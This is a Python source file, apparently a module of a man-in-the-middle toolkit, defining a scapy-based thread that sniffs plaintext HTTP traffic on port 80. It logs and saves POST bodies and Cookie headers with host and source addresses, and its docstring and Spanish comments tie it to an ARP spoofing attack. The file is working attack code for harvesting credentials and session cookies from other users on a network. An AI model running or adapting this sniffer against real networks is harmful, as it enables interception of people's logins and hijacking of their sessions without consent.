
import threading
from scapy.all import *
from urllib.request import unquote

from src import files, packet_utilities
from src.log import log, verbose


class HTTP_Sniffer(threading.Thread):
    """Thread of the HTTP Sniffing module.
    
    Sniffs every HTTP Post packet, looking for interesting information.
    """
    
    def __init__(self, exit_event, attributes, get_every_cookie, timeout):
        """Creates the thread.
        
        Parameters:
            exit_event (threading.Event): the event that will be checked to
                finish the thread and so the ARP Spoofing attack.
            attributes (list, str): this can be a list with every attribute 
                that will be looked for, or a string with '*', meaning that 
                every attribute is relevant.
            timeout (int, None): the time in seconds of the duration of the
                sniffing. If None, it will last until CTRL-C is pressed.
            As a Thread, it can also have any of a thread parameters. See
            help(threading.Thread) for more help.
        """
        super().__init__()
        self.exit_event = exit_event
        self.timeout = timeout
        self.get_every_cookie = get_every_cookie
        self.packets_ids = []

        if attributes == "*" or attributes == "":
            self.relevant_attributes = "*"
        else:
            self.relevant_attributes = files.get_lines_from_file(attributes)
            if get_every_cookie:
                self.relevant_attributes.append("cookie")
        
        
    def _results(self, all_packets):
        """Shows the results of the sniffing, displaying the data obtained.
        
        Parameters:
            packets (scapy.plist.PacketList): list of HTTP post sniffed
                packets that will be analyzed.
        """
        
        #Filters HTTP Post packets
        packets = [p for p in all_packets if b"POST" in p["Raw"].load]
        
        if len(packets) > 0: loc = files.save_packets(packets)
        else: loc = None
        log.sniff.info("finish", len=len(packets), loc=loc)
        if verbose.sniff.results and len(packets) > 0:
            print(". Analyzing packets...\n")
            for i, packet in enumerate(packets):
                print("\033[94mPACKET " + str(i) + "\033[0m:")
                items = packet_utilities.get_relevant_data_from_http_packet(self.relevant_attributes, packet).items()
                for item in items:
                    print(item[0] + ":", item[1])
                print()
        else:
            print()
    
    
    def _get_cookies(self, packet):
        cookies = packet_utilities.get_header_attribute_from_http_load("Cookie", packet.load).decode()
        if cookies: return cookies[8:-2]
        else: return ""
            
    def _handle_packet(self, packet):
        """Handles every HTTP post packet, logging when it is called."""
        host = packet_utilities.get_host(packet["Raw"].load.decode('utf-8', "ignore"))
        src=packet["IP"].src
        
        if b"POST" in packet["Raw"].load:
            log.sniff.info("packet_found", host=host, src=src)
        
        else:
            cookies = self._get_cookies(packet)
            if cookies:
                log.sniff.info("cookies_found", host=host, src=src, cookies=cookies)
        
        self.packets_ids.append((packet.ack, packet.seq))
        
    def run(self):
        """Method representing the thread's activity. It is started when start
        function is called.
        
        Sniffs every HTTP post packet, saying when it gets one of them. When
        finished, it displays all the information and save the packets.
        """
        #SNIFF, al tener stopperTimeout y stopper, no es la funcion original de Scapy, sino una modificada por mi
        #ya que la original no tenía manera de pararse cuando se quisiera. más informacion en sendrecv de Scapy
        #lo malo de esto es que para de sniffear cada stopperTimeout segundos para comprobar si stopper devuelve True,
        #con lo que puede perder algun paquete en ese proceso (cuando escribo esto aun no se ha dado el caso)
        
        #Es necesario el uso de self.packets_ids, ya que cuando se usa ARPSpoofer, se sniffea tanto
        #cuando llega un paquete como cuando se le hace forward. por ello se usa packets_ids para no repetir paquetes.
        
        log.sniff.info("start", timeout=self.timeout)
        #lfilter=lambda x: x.haslayer("Raw") and b"POST" in x["Raw"].load and not (x.ack, x.seq) in self.packets_ids, \
        try:
            packets = sniff(timeout=self.timeout, filter="tcp and dst port 80", \
                            lfilter=lambda x: x.haslayer("Raw") and not (x.ack, x.seq) in self.packets_ids, \
                            prn= self._handle_packet, \
                            stopperTimeout=3, stopper=self.exit_event.is_set)
        except PermissionError as err:
            log.sniff.error("permission_sniffing", err=err)
        self._results(packets)
        
    


    


